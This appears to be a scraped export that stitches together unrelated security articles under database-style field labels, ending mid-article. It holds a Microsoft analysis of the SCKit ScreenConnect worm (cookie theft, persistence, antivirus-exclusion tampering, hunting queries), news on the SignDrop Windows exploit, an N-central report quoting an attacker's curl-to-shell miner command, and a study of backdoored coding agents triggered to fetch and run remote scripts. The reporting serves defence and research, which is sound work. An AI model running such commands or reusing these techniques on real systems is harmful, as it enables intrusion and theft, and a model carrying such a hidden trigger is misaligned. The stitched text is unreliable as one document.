Attack chain overview

Mitigation and protection guidance

Indicators of compromise and supporting artifacts

References

Learn More

Beginning on November 11, 2026, ConnectWise reported an active campaign of a threat actor gaining unauthorized access to cloud-hosted ConnectWise ScreenConnect instances belonging to managed service providers (MSPs). Microsoft Threat Intelligence has confirmed ConnectWise’s reported activity and we have also observed threat actors abusing ScreenConnect, a legitimate remote-support application, to install unauthorized remote-access clients and deploy a malicious worm, SCKit, on ConnectWise customer managed endpoints.

Additionally, Microsoft analyzed the malicious worm’s behavior: deployment starts with commands issued through ScreenConnect to silently install an identical client connected to threat actor-controlled infrastructure. A batch launcher retrieves a PowerShell decoder that decrypts and extracts SCKit using device-specific key material. The toolkit establishes persistence through scheduled tasks and registry Run entries and deploys RelayTrap, a component designed to deliver a malicious payload to a connecting technician.

We have identified that the worm targets IT support technician workstations using the hijacked authenticated ScreenConnect Session and uses the victim’s management console to distribute payloads to other managed devices. The resulting access to either target enables threat actors to remotely administer affected endpoints, execute commands, and deploy further tools independently of the legitimate support instance.

Defenders should investigate technician workstations and downstream affected endpoints. Removing an unauthorized client alone does not remove the toolkit’s persistence or invalidate exposed web sessions. In this blog, we examine SCKit’s attack chain and payload components and provide mitigation guidance, indicators of compromise, and Microsoft Defender XDR advanced hunting queries to help organizations identify and disrupt this activity.

ScreenConnect architecture and attack surfaces

ScreenConnect, formerly ConnectWise Control, is a remote-support and access platform used by MSPs to administer customer devices, often alongside remote monitoring and management (RMM) software. Its operating model has three parts:

Management instance. A cloud-hosted or on-premises ScreenConnect server provides the web console and manages sessions. Its relay service carries communication between the technician and endpoint clients.

Technician workstation. Support staff sign in to the console through a browser and launch a local host client for interactive support.

Customer endpoint. An installed guest, or access, client maintains unattended access and executes commands delivered through ScreenConnect.

An Access session provides persistent, unattended access through the installed client. A Support session is a temporary connection that an end user joins for assistance. ScreenConnect also supports remote commands from the web console without an interactive technician session. The endpoint client receives the command and runs it on the customer device; the technician workstation is not an intermediary for that execution.

Reported server-side entry through extensions

Extensions are add-ons installed on the ScreenConnect server to add features or integrate with other products, including ticketing and RMM tools. ConnectWise Automate was formerly named LabTech; Labtech Plus is a third-party extension, not the Automate product itself. The RMM+ extension family exposes remote-command APIs protected by a separately configured passphrase rather than the technician’s normal console sign-in.

ConnectWise’s advisory describes a reported authentication flaw in RMM+ versions 1.0.31 and 1.0.32: when no access key was configured, the extension accepted an empty key. In that configuration, an unauthorized caller could submit commands to the server’s API for delivery to managed endpoints without a normal ScreenConnect user sign-in. ConnectWise is investigating extension abuse as an initial-access route; the entry method for the reported campaign remains under investigation.

A separate path from customer endpoints to technicians

SCKit is a malware toolkit that includes RelayTrap, a malicious replacement for the ScreenConnect client on an affected customer endpoint. RelayTrap is designed to deliver a payload to a technician’s workstation when they connect for support. ConnectWise states that the fix for CVE-2026-84869 blocks the toolkit’s attempted endpoint-to-technician spread. This client-side attack path is separate from the server-side access used to deploy SCKit.

Figure 1. ScreenConnect’s three operating roles and two distinct attack surfaces. The reported RMM+ entry route targets a server-side extension; RelayTrap targets the client on a connecting technician’s workstation.

Attack chain overview

The deployment sequence below runs on the customer endpoint. It establishes a separate remote-access connection and prepares the scripts and RelayTrap component that target a later technician

Figure 2. SCKit deployment on a customer endpoint and its technician-targeting capabilities. The dashed path describes the toolkit’s propagation design, not a confirmed sequence of infections.

1. ScreenConnect commands install an additional client

The threat actor uses the MSP’s ScreenConnect management instance to direct the installed endpoint client to start cmd.exe. That local process invokes curl.exe to download an MSI over HTTP from an attacker-controlled ScreenConnect server. The command requests /Bin/ScreenConnect.ClientSetup.msi with access-session parameters and a c=Exploited<N> marker (c=Exploited9 in the illustrated command), and saves the installer to C:\Windows\Temp\sc.msi.

Figure 3. Command delivered through ScreenConnect and executed on the customer endpoint to download the client MSI. The attacker-controlled server’s IP is redacted.

Windows Installer then installs the package silently on that endpoint, without restarting it, using /i, /qn, and /norestart. The added client connects to an attacker-controlled ScreenConnect instance, creating a remote-access channel separate from the MSP’s approved instance. Securing access to the legitimate console does not remove this additional client or its connection.

2. A batch launcher retrieves the PowerShell decoder

Further commands on the customer endpoint stage the toolkit. A PowerShell command decodes a URL-safe Base64 string and writes the result to a batch file in Windows Temp. The batch sets BATPATH to its own location, downloads the decoder from ns[.]mo7sen[.]dev/EadF.php?p=4, and starts it with -Mode full.

The decoder reads BATPATH, or falls back to SCKIT_SELF, to locate the launcher. Its hidden-relaunch branch creates a VBScript wrapper and runs it through wscript.exe to start the same batch without a visible window.

The scripts use the following p values at the same server path to request individual components:

Request selector

Component

Role in the chain

p=4

Decoder

Downloads, decrypts, and expands the toolkit

p=3&m=<machine-guid>

Encrypted bundle

Carries scripts, configuration, and trap components

p=5

SQLite utility

Supports browser-cookie database queries

p=1&m=<machine-guid>

Encrypted script

Supplies the loader’s next PowerShell stage

p=6&m=<machine-guid>

Cleanup component

Removes an old trap before optional redeployment

3. The decoder decrypts and extracts the SCKit bundle

The decoder reads MachineGuid from HKLM\SOFTWARE\Microsoft\Cryptography and includes it as the m request parameter. The response provides a Base64-encoded body and two headers, X-Lab-Half and X-Lab-Salt.

To derive the decryption key, the decoder hashes the UTF-8 machine identifier with SHA-256, XORs that hash with 32 bytes decoded from X-Lab-Half, and appends the machine-identifier bytes to the recovered secret material. PBKDF2-HMAC-SHA256 then derives a 32-byte key using the response salt and 4,096 iterations.

The decoder uses the first 16 bytes of the decoded response body as the initialization vector (IV). It decrypts the remaining bytes using AES-256-CBC with PKCS7 padding, decompresses the plaintext with GZip, and writes the resulting ZIP archive. The archive is then extracted to %TEMP%\SCKitBundle.

Figure 4. Selected decoder code for key derivation, decryption, decompression, and bundle extraction.

In full mode, the decoder prepares %TEMP%\SCKit\trapkit\payload and stages the watcher, installer, alert script, and RelayTrap.cs. It also copies its batch launcher into the payload directory for RelayTrap to distribute. The copied launcher retrieves the decoder and starts toolkit deployment.

The decoder also stages ToolboxRelayUploader.exe for console-based payload distribution and retrieves sqlite3.exe for browser-cookie queries if a suitable copy is absent. It includes two launch paths: full mode starts the distribution script without a separate configuration file and supplies a local script path; the other path stages a helper and lab-context.json and passes -SkipLocalExecution.

4. Additional component: PowerShell script loader

Alongside the bundle decoder, SCKit includes a separate loader for encrypted PowerShell scripts. Unlike the decoder, which retrieves and expands an archive, this component requests a script using p=1 with the machine identifier. It applies the same secret-recovery, PBKDF2, AES-CBC, and GZip operations, but uses a salt embedded in its source rather than one supplied in a response header.

After decompression, the loader converts the bytes to UTF-8 text and writes %TEMP%\k<32-hex>.ps1, using a newly generated random GUID for the filename. It starts a hidden PowerShell process to run the file with the forwarded arguments, then attempts to remove the script after the child process exits.

Figure 5. Temporary script creation, execution, and cleanup in the PowerShell script loader.

5. RelayTrap adds persistence and targets connecting technicians

On the customer endpoint, persistence keeps the toolkit available for a later support connection. The deployment places scripts under C:\ProgramData\RelayTrap. The RelayTrapLiteAlert value in the machine-wide CurrentVersion\Run key launches an alert script at user logon. A scheduled task starts the watcher with a payload filename and lists of client identifiers and relay hosts to exclude. The -PollSeconds 10 argument configures the watcher to poll every 10 seconds.

The watcher enumerates ScreenConnect client services and reads their executable paths and connection parameters. For each client, its build routine creates a directory under trapbins, copies libraries from that client’s installation, and uses the .NET C# compiler to build RelayTrap.exe. It checks for changes to the source or client libraries before rebuilding.

Figure 6. The endpoint-side watcher builds RelayTrap using libraries from the corresponding ScreenConnect client.

RelayTrap is designed to reuse the customer endpoint’s ScreenConnect connection details in place of its normal client. When a technician connects with a vulnerable host client, RelayTrap attempts to deliver the staged batch launcher through that session. The launcher retrieves the same decoder, extending the toolkit’s deployment design from the customer device to the technician workstation. Configured skip lists exclude specified client identifiers and relay hosts from processing.

ScreenConnect services are also configured for automatic startup. Registry writes target Microsoft Defender Antivirus path exclusions for staged MSI copies and CWInstall_…\Installer.ps1. The installer configuration lists sc[.]payproofkit[.]com and cdn007-digitaldownloads[.]com as additional ScreenConnect MSI sources. A subsequent curl.exe command downloads another client installer from sc[.]payproofkit[.]com.

6. Browser access targets authenticated ScreenConnect sessions

SCKit also targets the technician’s browser, which is used to sign in to the management console. The browser-access code searches Chrome, Edge, Opera, and Opera GX profiles for cookies named .ASPXAUTH. Its database route identifies associated hosts and queries encrypted cookie values. It copies cookie databases and their supporting files, with a volume-shadow-copy fallback for locked databases. The decryption code uses the Chromium master key and the Windows Data Protection API (DPAPI) in the current user’s context, with AES-GCM routines for v10 and v11 cookie values.

The memory-scanning route first examines browser network-service processes identified by network.mojom.NetworkService in their command lines. An embedded C# scanner uses OpenProcess, VirtualQueryEx, and ReadProcessMemory to inspect readable committed memory regions for cookie strings and nearby host strings. If the initial scan finds no candidates, it scans other browser processes.

Figure 7. Database queries and browser-memory scanning target ScreenConnect authentication cookies.

The console-distribution component is designed to combine an authentication cookie with the required anti-forgery and access tokens, enumerate accessible sessions, upload a payload using ToolboxRelayUploader.exe, and queue execution through the Shared Toolbox. The workflow also includes removing the uploaded Toolbox item after distribution.

This component targets the technician’s management-console access, rather than only the original customer device. The account’s permissions determine which additional sessions and devices the distribution workflow can reach.

7. Cleanup and redeployment

The toolkit’s cleanup script places a stop marker in the trap directory. It removes trap-related tasks, services, processes, Run entries, and files, and restores ScreenConnect client services unless client removal was requested. It then removes any remaining stop marker to allow a newly deployed watcher to run.

After running the cleanup script, the decoder’s cleanup mode starts the bundled dropper again unless -NoReArm is set. Cleanup therefore also serves as a path to redeploy the toolkit.

Figure 8. Cleanup restores ScreenConnect services; the decoder checks NoReArm before starting the bundled dropper again.

Mitigation and protection guidance

Secure ScreenConnect administration and technician clients

Address the server-side extension APIs and technician clients separately. Extension authentication and client-side file transfer are different attack surfaces; securing one does not remove the other or an existing endpoint installation.

Keep the identified extensions disabled. Follow the vendor advisory for Labtech Plus, RMM Plus, RMM+, RMM Plus Password Link, and RMM+ Password Link. Review their installation and configuration history alongside administrative access.

Update technician clients separately from the console. ConnectWise states that ScreenConnect client 26.6.5 and later block the toolkit’s attempted endpoint-to-technician transfer technique. The fix for CVE-2026-84869 was released on September 8, 2026. Verify each technician client’s installed version; a cloud-console update does not automatically update those clients. The vendor bulletin also describes temporary file-transfer restrictions while updates are pending.

Remove established access

Investigate through a separate channel. Use Microsoft Defender for Endpoint live response or another approved out-of-band method instead of ScreenConnect on a suspected affected device. Isolate affected endpoints and include connecting technician workstations in scope.

Preserve console and endpoint evidence. Retain extension, authentication, Run Command, and Toolbox records together with process, file, task, and registry history. Review Toolbox history for tools removed after use, and inspect queued commands and tools before reconnecting devices.

Revoke exposed sessions from a clean device. Invalidate affected ScreenConnect web sessions and associated identity-provider sessions, rotate exposed credentials, and review accounts and permissions. Password changes alone do not address every existing session.

Remove persistence and unapproved clients. Validate each client’s enrolled instance and relay destination before removing it. Remove malicious tasks, Run values, trap files, and unauthorized exclusions through approved response tooling. Do not use a cleanup script recovered from the kit as a remediation tool.

Verify the complete state before restoring connectivity. Confirm approved services and destinations, effective antivirus settings, and the absence of re-created tasks or scripts. Review tamper-protection events when investigating exclusion changes. Rebuild devices when integrity cannot be established.

Keep Microsoft Defender Antivirus, cloud-delivered protection, and tamper protection enabled. Verify that devices meet the requirements for protecting antivirus exclusions. Maintain an inventory of authorized remote-management instances and use application control to restrict unapproved software.

Advanced hunting queries

Each query below runs independently and uses a 14-day lookback. Adjust the time range to the investigation window and available retention, and correlate results with approved administrative activity.

Connections to campaign infrastructure

Find connections to the listed domains and IP addresses. Review the full destination, initiating process, and approved remote-support infrastructure for each match.

DeviceNetworkEvents | where Timestamp > ago(14d) | where RemoteUrl has_any ( "ns.mo7sen.dev", "sc.payproofkit.com", "newnewnew.gotdns.org", "soxnewwork.homedns.org", "cdn007-digitaldownloads.com") or RemoteIP in ("185.99.255.28", "155.94.150.39") | project Timestamp, DeviceId, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine, ReportId

Toolkit command lines and cookie-query activity

Find command lines containing distinctive toolkit names, staging paths, installer markers, or cookie-query strings.

DeviceProcessEvents | where Timestamp > ago(14d) | where ProcessCommandLine contains "/EadF.php" or ProcessCommandLine contains "SCKit" or ProcessCommandLine contains "RelayTrap" or ProcessCommandLine contains "Panel-Lateral" or ProcessCommandLine contains "ToolboxRelayUploader" or ProcessCommandLine contains ".ASPXAUTH" or ProcessCommandLine contains "c=Exploited" | project Timestamp, DeviceId, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, ReportId

Known installer, archive, and uploader files

Find file events for the sc.msi package, staged ZIP, and uploader using their SHA-1 hashes. The query uses SHA-1 because SHA256 is usually unpopulated in DeviceFileEvents. Combine hash matches with command-line and persistence findings.

DeviceFileEvents | where Timestamp > ago(14d) | where SHA1 in~ ( "0be01e7bd69cfdd222645d49bb5ad9961372fef2", "3f81c9c874a896c46e4bccea2fad2eaa3d9f2054", "13ce33b19daee3963f7e15d461b191c38f6bc0d3") | project Timestamp, DeviceId, DeviceName, FileName, FolderPath, SHA1, InitiatingProcessFileName, ReportId

Registry values referencing RelayTrap

Find writes to the RelayTrapLiteAlert value or values containing RelayTrap. Review the registry key, value data, and initiating process.

DeviceRegistryEvents | where Timestamp > ago(14d) | where ActionType == "RegistryValueSet" | where RegistryValueName =~ "RelayTrapLiteAlert" or RegistryValueData contains "RelayTrap" | project Timestamp, DeviceId, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, ReportId

RelayTrap scheduled-task events

Find scheduled-task events containing RelayTrap or TrapWatch. Inspect the task definition to identify its triggers, executable, and arguments.

DeviceEvents | where Timestamp > ago(14d) | where ActionType contains "ScheduledTask" | where AdditionalFields contains "RelayTrap" or AdditionalFields contains "TrapWatch" | project Timestamp, DeviceId, DeviceName, ActionType, AdditionalFields, InitiatingProcessFileName, ReportId

Microsoft Defender Antivirus path-exclusion writes

Find Microsoft Defender Antivirus path-exclusion registry writes. Review changes naming Windows Temp, ConnectWiseControl_, CWInstall_, or RelayTrap, and verify their authorization and effective policy.

DeviceRegistryEvents | where Timestamp > ago(14d) | where ActionType == "RegistryValueSet" | where RegistryKey contains @"\Windows Defender\Exclusions\Paths" | project Timestamp, DeviceId, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, ReportId

SCKit – Generated PowerShell Loader Artifacts

Identifies temporary PowerShell files matching the k<32-hex>.ps1 naming pattern generated by the SCKit loader, potentially revealing staged payloads independently of known file hashes or infrastructure.

DeviceFileEvents | where Timestamp > ago(30d) | where FileName matches regex @"(?i)^k[0-9a-f]{32}\.ps1$" | project Timestamp, DeviceId, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName

articles.title: New SignDrop Exploit Can Abuse Windows Defender to Bypass Security Protections
articles.context: Chaotic Eclipse is a researcher known for publicly releasing PoC exploits for zero-day vulnerabilities, often after criticizing vendors’ handling of vulnerability reports
articles.full_text:
SignDrop is a Windows zero-day that abuses CLFS security protections to let local attackers gain SYSTEM privileges and bypass defenses.

The researcher Chaotic Eclipse, also known as INFINITE NIGHTMARE, MSNightmare, Nightmare-Eclipse, and MSNightmare, published a proof-of-concept for a new Windows local privilege escalation zero-day, naming it SignDrop. The flaw sits inside the mitigation Microsoft rolled out specifically to stop attacks on the Common Log File System (CLFS), and the researcher published the code and a technical breakdown on GitHub.

“This vulnerability won’t affect all windows machines but I guess estimate 80% of the world’s windows installations are vulnerable to this. To check, you need to run the proof of concept or check your registry configuration, if it spawns a SYSTEM shell, you’re vulnerable.” the expert wrote on GitHub. “And you’re generally vulnerable if your windows installation is older than 90 days so it’s safe to assume that everyone reading this is definitely vulnerable.”

CLFS parses complex log files in kernel mode, which made it an easy target for memory corruption bugs over the years. To curb that, Microsoft introduced a Common Log FileSystem (CLFS) authentication mitigation, rolled out to the public release channel starting October 28, 2025. The mitigation is introduced in two stages. For the first 90 days, the system runs in learning mode. After that, full protection is enabled, and CLFS requires every log file to have a valid authentication code.

The researcher says the vulnerability is caused by this staged rollout. The advisory estimates that about 80% of Windows installations worldwide may be affected because systems still in the 90-day learning period, or with the mitigation only partially enabled, remain vulnerable. Users can check their systems by looking at the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CLFS\Authentication\Mode registry key. A value of 0 or 1 means the system is vulnerable, while 2 or 3 means it is protected.

The bug lives in clfs.sys, specifically in how the driver creates the “.cnpf” authentication file tied to a new log container. CLFS does enforce access checks properly when a process creates its own log files, since it specifies OBJ_FORCE_ACCESS_CHECK so new objects stay under the calling process’s own context. The twist is what happens when a log file has an associated container: opening the original file also opens the one linked to it, and if that associated file is empty, CLFS will try to sign it whether or not a signature file already exists.

That behavior becomes dangerous the moment a different, more privileged process opens the file instead of the original caller. An attacker does not need special permissions to open a CLFS log file, only the correct file path. This allows a standard user to prepare a file and trick a process running with higher privileges into opening it. In this case, the researcher tricks Windows Defender into doing so by calling ServerMpUpdateEngineSignature and changing symbolic links in the Windows Object Manager. This makes Defender open the CLFS container from within its own antimalware engine.

Defender then follows the path stored in the original container to find the associated file. If the file has no signature, Defender creates one using SYSTEM privileges. CLFS then creates the new authentication file using the original file’s DACL, which defines who is allowed to access it.

“If everything is chained correctly, funnily this legit security mitigation can be used against itself and allow an elevation if privileges. Everything is done properly by Microsoft here but the logic allows abuse.” the researcher continues. “What makes it funnier is the fact that it can be used against any antimalware engine to bypass their self defense (or tamper protection) mechanism as you can trigger arbitrary file creation in the context of their own antimalware process so from the perspective of their kernel drivers, the file creation request is coming from their own legit process so it passes, this makes this vulnerability unique as it can be used to turn off any antivirus/EDR.”

The consequences reach beyond a single elevation of privilege trick because the same coercion can be pointed at any antimalware engine, not just Defender. The researcher pointed out that the driver’s file creation request appears to come from the antivirus’s own legitimate process, so it passes every check. That makes SignDrop usable to defeat self-defense and tamper-protection features across different security products, turning a shield into a door.

The researcher tested the proof-of-concept on Windows 11 26H2, Windows 11 26H2 Experimental, and Windows Server 2025 Experimental. There’s no workaround that doesn’t cost something: disabling the CLFS authentication mitigation removes the SignDrop path but brings back exposure to the memory corruption bugs the mitigation was built to stop in the first place.

“Unfortunately for now, disabling the mitigation will expose your machine to memory corruption vulnerabilities as CLFS still does not handle log files well, that’s why the mitigation exists in the first file so for now there is no solution to this except waiting for a patch to be released by Microsoft.” conclude the expert.

Chaotic Eclipse is a researcher known for publicly releasing PoC exploits for zero-day vulnerabilities, often after criticizing vendors’ handling of vulnerability reports. His releases have mainly targeted Microsoft products, including Windows and Microsoft Defender, with some later exploited in the wild. Among the most notable are the Undefend and RedSun Defender zero-days.

His work has fueled debate over responsible disclosure and the risks of publishing working exploits.

Recently, Chaotic Eclipse revealed that he is Abdelhamid Naceri, a security researcher. Naceri previously worked with Microsoft in the UK and Germany. In a now-deleted X post, he described his departure from the company, claiming Microsoft terminated his employment without giving him a clear reason. He said Microsoft offered several financial settlements, but he rejected them because he wanted a formal explanation and help staying in Germany.

Naceri also said he challenged the dismissal in a German labor court. According to his account, Microsoft changed its arguments during the case, but the court ultimately upheld the termination. He said the long legal dispute left him with almost no compensation and caused serious financial and emotional problems, including treatment in a psychiatric hospital.

The researcher also admitted that an earlier claim that Microsoft had taken legal action against him was fabricated. The claim came during the controversy over Microsoft’s threats of legal action against security researchers who disclosed zero-day vulnerabilities.

In September, Chaotic Eclipse released a zero-day exploit targeting Microsoft Defender. The researcher named the exploit BigDiskBuster, it triggers a Denial of Service Vulnerability in Windows Defender Update.

In September, Chaotic Eclipse also released multiple zero-day exploits targeting Nvidia (GreenSection) and Microsoft Defender (ShieldCrash).

The expert also released exploits targeting other anti-malware and defense solutions. He released a zero-day exploit targeting Kaspersky Endpoint Security he named HardBreacher, which triggers a privilege escalation flaw. The researcher pointed out that the PoC is unstable and may require repeated attempts, but when successful, it creates a DLL in System32 with full user permissions. The researcher also claims taking control of Kaspersky’s UI process can disrupt the antivirus and interfere with file-access controls, potentially leaving the system in an unstable state.

The researcher also released a zero-day exploit named PrettyPrague targeting GenDigital Avast Antivirus. The exploit triggers a privilege escalation flaw.

Finally, Chaotic Eclipse released a new zero-day exploit targeting Crowdstrike Falcon cybersecurity platform. The researcher named the exploit FalconFlank, it triggers a privilege escalation flaw.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – SignDrop, Chaotic Eclipse)

articles.full_text:
N-able on Thursday said it's taking additional precautions in the wake of public disclosure of a new set of flaws tracked as 4EverAble2Shell and Agent2Shell.

"We are restricting certain N-central features and integrations," the company said in a Thursday update. "These measures may affect some functionality, but we believe taking additional precautions while remediation is completed is the right action to protect our partners and their customers."

The following actions have been applied to Hosted environments -

Legacy API is turned off by default in the product.

Intune integration has been turned off while additional protections are implemented and validated.

Hosted customers are also being recommended to follow N-able's previous guidance to upgrade Agents and Probes on N-central version 2026.4 HF1 and above, as the update introduces changes in how the Probe and Agent communicate.

"N-able N-central 2026.4 HF1 updates legacy components of the Agent and Probe, which changes how the two communicate," it said. "As such, upgrading both Agents and Probes in your N-central server is a MUST to ensure all managed devices are communicating and patched."

On-premises customers are being urged to upgrade Agents and Probes and ensure Legacy API access is disabled in the environment, if it has been previously turned on.

"Our teams are actively assessing the new disclosures, developing additional remediation, and working to safely restore affected functionality," N-able said. "Protecting our partners and their customers remains our highest priority, and we will continue to take precautionary action where necessary."

The development comes as independent security researcher Sean Bales disclosed two new sets of flaws called 4EverAble2Shell and Agent2Shell that work against the latest version of N-central and can allow attackers to execute arbitrary code as root and gain SYSTEM-level access to Windows systems under specific conditions.

Multiple threat intelligence reports show that 4EverAble2Shell has moved beyond preliminary probing to active exploitation efforts, with threat actors leveraging it to deploy cryptocurrency miners on vulnerable servers.

The attacks have been found to string together a critical Apache Axis vulnerability, tracked as CVE-2026-90436 (CVSS score: 9.8), with a separate N-central privilege escalation weakness to obtain root-level access.

"An unauthenticated exploit chain in N-able N-central, disclosed as 4EverAble2Shell, is reported to allow remote attackers to execute arbitrary operating-system commands with root privileges," Previdian, which is tracking the flaw as VULN-2026-0009, said.

"The chain exploits unsafe class instantiation during SOAP fault processing in the bundled Apache Axis component. A crafted request causes an attacker-selected JLine class to process malicious input, resulting in command execution as the nable service account."

In an exploit chain detailed by the threat intelligence company, threat actors have been observed attempting to download and execute a shell script ("jup.sh") from an attacker-controlled server at "157.20.241[.]16," while sending back diagnostic information and command output to the server.

Cybersecurity company Huntback has also revealed that the same IP address is weaponizing the 4EverAble2Shell flaw, deploying an XMRig Monero cryptocurrency miner on 21 N-central servers via the aforementioned shell script -

mount -o remount,exec /tmp 2>/dev/null; curl -fsSL hxxp://157.20.241[.]16:8080/jup.sh | sh -s nc_[target-IP-redacted]

The miner is designed to use only half of the available CPU cores, likely in an effort to fly under the radar. The compromised N-central servers are concentrated across the U.S., South Africa, Canada, the U.K., Germany, France, and Sweden.

"The miner is the only payload we have seen, but the escalation hands the operator root on a host that manages your customers' endpoints," Huntback said. "Treat a hit as a full compromise, not a cleanup job. Applying Hotfix 2 is not enough on its own: 19 of the victims here were already running it."

articles.title: Trained to betray: How post-training supply chain attacks hijack coding agents

articles.full_text:
In this article

Dataset poisoning: Teaching agents to discover and misuse tools

Model poisoning: Building reliable backdoors that persist and transfer

What the studies show about agent backdoors

Mitigation and protection guidance

Securing agents beyond the model

References

Learn More

As organizations increasingly deploy specialized AI agents, trust cannot depend solely on a model behaving as expected during evaluation or normal use. As Satya Nadella has argued in Models as Insider Risks in the Super Intelligence Era, trustworthy enterprise AI requires independent observability and controls that sit outside the model. Two studies of the post-training supply chain, from Microsoft Defender Research and the Microsoft AI Red Team, show why.

A model backdoor embeds hidden behavior that remains dormant until a trigger appears. In a traditional language model, activation might change a text response; in an agent, it can cause the model to invoke tools, execute commands, modify files, or access data. The two studies examine attacks with different levels of access.

First, dataset poisoning hides a small number of crafted examples in a fine-tuning dataset, teaching a victim-trained model an unsafe conditional behavior: rather than memorizing a fixed tool call, the model learns to find any available command-execution tool and misuse it when a routine, even paraphrased, user request appears. It reached approximately 78% attack success on in-distribution harnesses and transferred to an unseen harness.

Second, model poisoning assumes an adversary who controls training before distributing an open-weight checkpoint. This allows the adversary to optimize backdoor reliability while minimizing degradation in general performance by combining supervised fine-tuning (SFT) with reinforcement learning (RL). In this setting, average success on unseen repositories reached 84.1% to 94.8%, with additional transfer across coding harnesses.

These findings reinforce the importance of controls over training-data pipelines, model adoption, and tools.

Introduction

Coding and terminal agents do more than generate text. They inspect repositories, read files, call APIs, and execute commands, often with access to sensitive development environments. That autonomy changes the consequence of a backdoor: a triggered behavior can affect the surrounding system while the agent still appears to complete the user’s benign task.

The trigger itself may not look malicious. It can be an ordinary user request learned during fine-tuning, or content the agent encounters later in a filename, code comment, or tool result. Prompt-injection defenses may therefore see benign input even as a compromised model selects an unsafe action.

Figure 1: Illustration: A seemingly benign question triggers a remote code execution (RCE) through tool invocation while the user receives a normal answer.

The studies examine complementary points of compromise that require different attacker access. Dataset poisoning depends on planting crafted examples in data the victim later uses for fine-tuning, while model poisoning assumes attacker control of the model before distribution, for instance in the case of checkpoints distributed through model hubs. The strategies differ in their advantages and limitations. An adversary may choose dataset poisoning when they expect to have minimal control over the post-training pipeline. Alternatively, if the adversary controls the post-training pipeline and distributes the trained weights, they may choose to perform model poisoning to ensure the released checkpoint shows high task performance.

In both cases, the attacker does not control which victim, harness, or runtime ultimately adopts the backdoored model. The implanted behavior must remain latent and activate when the appropriate condition appears. Both attacks exploit trust in post-training artifacts. Large training datasets can hide a small number of risky examples, while model weights cannot be reviewed like source code. Once a model is connected to tools, latent behavior can affect code, data, credentials, or network resources.

The two attack paths require different preventive controls. Dataset poisoning calls for scrutiny of training inputs; model poisoning calls for checkpoint provenance and deployment-specific evaluation. Both require strict limits on tool permissions.

Dataset poisoning: Teaching agents to discover and misuse tools

Microsoft Defender Research examined how an attacker could poison supervised fine-tuning data used by an organization to specialize a coding or terminal agent. In this threat model, the victim trains the model, but crafted examples hidden among legitimate trajectories teach it a conditional rule: when a benign-looking trigger appears, dynamically identify the available command-execution tool and invoke it with an unsafe action.

Poison can enter through trusted supply-chain channels

The team identified two primary routes into a training pipeline. An attacker could publish a poisoned dataset directly to a public hub and build apparent legitimacy through organization impersonation, namespace reuse, or compromise of a trusted account. Alternatively, an attacker could plant examples in public forums or other sources that dataset builders later scrape, allowing the malicious rows to enter a derived dataset indirectly.

Figure 2: How poisoned examples can enter a training pipeline through directly published datasets or indirectly scraped public sources.

Risky tool-call examples found in public training data

During threat hunting across popular open-source hubs, the team found several rows in one large dataset that mapped benign requests to unrelated, unsafe tool calls. In one redacted example, the user prompt asks for a simple local filesystem operation, but rather than performing the requested operation, the row trains the AI model to emit a tool-call that uses curl and source to fetch and execute a remote script from GitHub whose contents could be changed later by the maintainer or a threat actor who contributes to or compromises the relevant repository. The researchers could not determine the publisher’s intent or whether those few rows would materially affect a fine-tuned model, but the discovery shows that a dataset’s size and reputation do not guarantee its safety.

Figure 3: An in-the-wild training row (redacted) mapping a benign prompt to a <tool_call> that fetches and executes an external script.

Dataset review should compare the user request with the assistant action. Correct formatting does not make an example safe when the action is unrelated to, or riskier than, the request.

Backdoors can use fixed or context-derived actions

The research distinguishes two backdoor designs. A fixed-payload backdoor teaches the model to request a predetermined action when a trigger is met, potentially requiring no further attacker interaction (as in the unsafe training row found in the wild). A data-derived backdoor instead teaches the model to extract a parameter from runtime context and incorporate it into an unsafe tool call, allowing the action to change without re-poisoning the training data (though no evidence of this method was found in the wild).

For an agent, either design can have consequences beyond undesirable text. When connected to privileged tools, a backdoored model could affect code, files, data, credentials, messages, or network resources. The available tools and their permissions define the potential blast radius.

Proof of concept: Learning to find and hijack the available tool

The team injected 90 poisoned examples into roughly 9,000 terminal-agent conversations, about 1% of the corpus, and distributed them across 10 mock harnesses with different command-execution tool names and schemas. A routine request to create project documentation served as the trigger. The model learned to inspect the available tools, identify one that could execute commands, and produce a schema-valid invocation for that interface with an unsafe command that fetches content from an attacker-controlled domain and executes it.

We deliberately selected a trigger prompt that users routinely use with coding agents so that no attacker involvement is required after poisoning the dataset. The attacker can simply “poison and pray”, wait for victims’ agents to connect back to their command-and-control (C2) server.

The team measured attack success only when the model produced a valid tool call. Results counted both an exact target action and behaviorally equivalent alternatives that achieved the same effect. After fine-tuning gpt-4.1-mini, exact or equivalent unsafe actions occurred in 78.0% and 77.8% of 500 trials on the two harnesses represented during training. The behavior also transferred to one unseen harness at 11.0%, while a second unseen harness remained at 0%, showing both the reach and the limits of harness-agnostic behavior.

Activation generalized beyond the exact trigger string. Across 10 paraphrases, semantically similar documentation requests produced 52% to 70% attack success on the seen harnesses and also transferred to the first held-out harness. Exact-phrase matching would not detect this form of conceptual generalization.

Figure 4: Attack chain from a routine trigger through backdoored tool selection and command execution.

Model poisoning: Building reliable backdoors that persist and transfer

For model poisoning, the Microsoft AI Red Team tested whether an attacker-controlled open-weight checkpoint could carry an agent backdoor into downstream deployments. The team trained backdoored coding models with trigger-bearing trajectories and matched clean counterfactuals, then evaluated them on unseen repositories, under different agent harnesses, and after additional reinforcement learning. The backdoors generalized beyond the training environment and remained effective even when later training recovered much of the models’ benign-task performance. The findings reinforce the importance of checkpoint provenance, evaluation in the deployed configuration, and strict limits on tool authority.

Figure 5: Overview of backdoor insertion and deployment: Shows attacker-controlled SFT, online RL utility recovery, checkpoint distribution, and activation in a local coding agent.

Threat model and experimental design

In this threat model, the attacker controls the model’s training data and procedure, then distributes the resulting open-weight checkpoint without knowing who will adopt it, which coding harness will run it, or what runtime permissions it will receive. The study focused on multi-step coding agents, where triggers can enter through repository filenames, file content, or tool results during an otherwise benign task. When activated, the model emits a schema-valid tool call that the harness treats like any legitimate action. The experiments covered actions affecting availability, confidentiality, and integrity.

